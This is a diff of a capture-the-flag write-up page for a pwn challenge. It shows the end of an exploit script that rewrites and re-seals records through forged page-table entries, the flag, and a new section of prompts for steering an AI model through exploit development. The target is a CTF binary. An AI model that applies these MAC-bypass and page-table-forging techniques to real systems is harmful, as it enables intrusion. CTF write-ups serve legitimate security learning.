+# R1's binding hash depends on the NEW R5 field -&gt; recompute, then re-seal R1 last
+l1b0 = fetch(R1_slot, 0x100); l188 = fetch(R1_slot, 0x108)
+ld8  = fetch(R1_slot, 0x110); l118 = fetch(R1_slot, 0x118)
+l148 = fetch(R1_slot, 0x120)
 H = mix((l1b0 &lt;&lt; 7) ^ NR5 ^ l188 ^ ld8 ^ rol(l118, 0xf) ^ (l148 &lt;&lt; 32)
         ^ 0x43b8d13d98a22104)
 store(R1_slot, 0x138, p64(H))
-r1 = [u64(fetch(R1_slot, 0x128 + i*8)) for i in range(5)]
+r1 = [fetch(R1_slot, 0x128 + i*8) for i in range(5)]
 store(R1_slot, 0x148, p64(seal1([r1[0], r1[1], r1[2], H, r1[4]])))
 
 # --- checkmate ---
-print(claim_record().decode(errors=&quot;ignore&quot;))      # -&gt; v1t{...}
+print(claim_record().decode(errors=&quot;ignore&quot;))            # -&gt; v1t{...}
 </code></pre>
-<p>The constant blanks (<code>C1</code>/<code>C2</code>/<code>C3</code>, <code>REC_SLOTS</code>) are read straight out of the binary's MAC and chain-walk routines; with them filled the script goes from a clean connection to printing the flag. Remote uses the same redpwn PoW as v1, solved before the menu loop.</p>
+<p>The blanks (<code>C1</code>/<code>C2</code>/<code>C3</code>, <code>REC_SLOTS</code>) are read straight out of the binary's MAC and chain-walk routines; they were locked in the moment the <code>encode_pte(...) == (lo, hi)</code> assertion passed. That assertion is the linchpin of the entire script — it is what converts &quot;the model transcribed some constants&quot; into &quot;the model transcribed the <em>right</em> constants.&quot;</p>
 <h2 id="flag">Flag</h2>
 <pre><code>v1t{revenge_requires_grooming_not_grep}
 </code></pre>
+<h2 id="lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</h2>
+<p>This is the section I care about most, because the write-up above makes it look cleaner than it was. The real skill on this challenge was not knowing splitmix64 — the model knows splitmix64 cold. The skill was <em>prompting it toward the load-bearing facts and refusing its confident-but-wrong detours.</em> Here is the reusable playbook for this class: a re-skinned kernel-primitive pwn with a homebrew keyed MAC sitting between you and the win.</p>
+<p><strong>1. Force the model to separate &quot;real crypto&quot; from &quot;bookkeeping crypto&quot; first.</strong> The biggest time-saver was making it classify each hash by whether it touches a secret:</p>
+<blockquote>
+<p>&quot;List every hash/MAC routine in this binary. For each, tell me whether its inputs include a per-session or per-workspace secret, or only record fields XORed with constants baked into the binary. I only care about the ones with a real secret — those are the ones I have to leak. The keyless ones I can just recompute.&quot;</p>
+</blockquote>
+<p>That reframed the seals from &quot;five scary MACs&quot; into &quot;five things I recompute after editing a field,&quot; and isolated the <em>one</em> genuinely-keyed MAC (the PTE) as the only thing worth attacking. Say it explicitly: keyless splitmix-over-constants is not a barrier, do not propose leaking those keys, there is no key.</p>
+<p><strong>2. Anchor every numeric claim to an executable check, and make the model write the check first.</strong> LLMs transcribe rotation amounts and XOR constants wrong constantly, and confidently. The defense is to demand the round-trip:</p>
+<blockquote>
+<p>&quot;Write <code>recover()</code> that inverts the PTE MAC and <code>encode_pte()</code> that builds it. Before you trust either, assert <code>encode_pte(*plaintext, *recover(*plaintext, lo, hi)) == (lo, hi)</code> on the leaked PTE. Do not write any page-table forging code until that assertion passes. If it fails, the bug is in a constant or a rotation amount, not in my grooming.&quot;</p>
+</blockquote>
+<p>The <code>encode_pte == (lo, hi)</code> equality is the oracle that proves the whole transcription at once. I caught two wrong constants this way — the model &quot;fixed&quot; them only because the assertion refused to pass, not because it spotted the error itself.</p>
+<p><strong>3. Turn failure <em>shape</em> into a constraint, don't just say &quot;it broke.&quot;</strong> When writes faulted but reads worked, I did not ask &quot;why doesn't it work.&quot; I told the model what the asymmetry meant:</p>
+<blockquote>
+<p>&quot;Reads succeed, writes fault. That asymmetry means the read and write paths are resolving different page-table indices — one side is applying an offset the other isn't. Find where the level-1 PTE index is computed and show me both the read and write index expressions side by side.&quot;</p>
+</blockquote>
+<p>That collapsed a vague failure into the <code>0x20 + j</code> vs <code>j</code> bug in one step. The general move: convert the <em>symptom's shape</em> into a statement about where the bug can live, and hand that to the model. This is &quot;grooming, not grep&quot; in prompt form — the model cannot grep its way to a page-table index error, so make it reason about layout.</p>
+<p><strong>Dead-ends to pre-empt in the prompt:</strong> (a) tell it the seals have no secret so it stops hunting for one; (b) tell it the buddy allocator is deterministic so grooming is reliable and it shouldn't propose spray-and-pray; (c) warn it about the 3-fault auto-lock so it verifies forged PTEs <em>before</em> a <code>store</code> that could fault and burn a reconnect/PoW; (d) tell it level-1 PTEs are at <code>0x20 + j</code>, because it will otherwise default to <code>j</code> and rationalize it.</p>
+<p><strong>How I verified / caught mistakes:</strong> three hard gates, in order — the <code>0xdeadbeef</code> UAF round-trip (the primitive is real), the <code>encode_pte == (lo, hi)</code> re-encode (the MAC transcription is exact), and a read-back of each record field after every <code>store</code> (the write landed before I spend the next fault). None of these were optional, and the model was not allowed to skip past any of them.</p>
+<p><strong>Fast-path prompt recipe for next time:</strong> <em>&quot;Classify each hash by whether it's secret-keyed — attack those, recompute the keyless ones; invert the one keyed MAC and prove it with an encode-equals-leak assertion before forging anything; treat read/write asymmetries as offset bugs and diff the index expressions; and verify every forged PTE before any write, because faults are budgeted.&quot;</em></p>
     </div>
 
     
@@ -269,7 +389,7 @@ print(claim_record().decode(errors=&quot;ignore&quot;))      # -&gt; v1t{...}
     <aside class="post-toc-wrap" aria-hidden="true">
         <nav class="toc" aria-label="Floating table of contents">
             <div class="toc-label">§ TOC — NAVIGATION</div>
-            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-2"><a href="#flag">Flag</a></li></ul>
+            <ul class="toc-list"><li class="level-2"><a href="#summary">Summary</a></li><li class="level-2"><a href="#solution">Solution</a></li><li class="level-3"><a href="#mapping-the-theme-onto-the-real-machinery">Mapping the theme onto the real machinery</a></li><li class="level-3"><a href="#the-win-condition-a-position-one-move-from-won">The win condition: a position one move from won</a></li><li class="level-3"><a href="#why-the-seals-are-a-free-lunch">Why the seals are a free lunch</a></li><li class="level-3"><a href="#the-bug-a-stale-view">The bug: a stale view</a></li><li class="level-3"><a href="#defeating-the-sealed-workspace-the-linchpin">Defeating the sealed workspace — the linchpin</a></li><li class="level-3"><a href="#arbitrary-page-r-w-record-surgery">Arbitrary page R/W → record surgery</a></li><li class="level-3"><a href="#rewriting-the-chain-and-re-sealing">Rewriting the chain and re-sealing</a></li><li class="level-3"><a href="#the-end-to-end-script">The end-to-end script</a></li><li class="level-2"><a href="#flag">Flag</a></li><li class="level-2"><a href="#lessons-learned-prompting-the-ai">Lessons learned - prompting the AI</a></li></ul>
         </nav>
     </aside>
 </main>
